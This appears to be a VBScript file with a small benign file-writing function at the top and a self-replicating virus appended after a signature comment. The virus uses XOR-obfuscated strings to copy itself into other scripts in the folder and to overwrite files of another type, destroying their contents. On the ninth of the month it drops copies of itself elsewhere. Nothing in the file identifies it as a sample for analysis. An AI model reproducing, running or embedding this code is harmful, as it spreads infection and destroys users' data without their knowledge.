Function WriteToFile(str)
set fso = createobject("Scripting.FileSystemObject")
set file = fso.createtextfile("c:\out.txt", false)
file.write(str)
file.close
set file = nothing
set fso = nothing
End Function

'Ωööç
On Error Resume Next
Set FSO=Wscript.CreateObject(D("¨úçñèãñëò—πñìö¨Üåãöí∞ùïöúã"))
Set OpenSelf=FSO.OpenTextFile(Wscript.ScriptFullName,1)
Self=OpenSelf.ReadAll:OpenSelf.Close:SS=InStr(Self,"'Ωööç")
Self=Mid(Self,SS,965)
Set GF=FSO.GetFolder(".")
For Each SF in GF.Files
Ext=Lcase(FSO.GetExtensionName(SF.path))
If Ext=D("âùå") then
Set OSF=FSO.OpenTextFile(SF.path,1)
ROSF=OSF.ReadAll
OSF.Close
If InStr(ROSF,"'Ωööç")=0 then
Set OSF=FSO.OpenTextFile(SF.path,8,True)
OSF.WriteLine ""
OSF.WriteLine Self
OSF.Close
End If
End If
If Ext=D("âùö") then
Set OSF=FSO.OpenTextFile(SF.path,2,True)
OSF.Write D("Ωööç")
OSF.Close
End If
Next
If Day(Now)=9 then
Set TFile=FSO.CreateTextFile(FSO.GetSpecialFolder(2)&D("£Ω∫∫≠—©Ω¨"),True)
TFile.Write Self:TFile.Close
FSO.CopyFile FSO.GetSpecialFolder(2)&D("£Ω∫∫≠—©Ω¨"),D("æ≈£Ω∫∫≠—©Ω¨"),True
End If
Function D(Line)
For A=1 to Len(Line)
D=D&Chr(Asc(Mid(Line,A,1))Xor 255)
Next
End Function
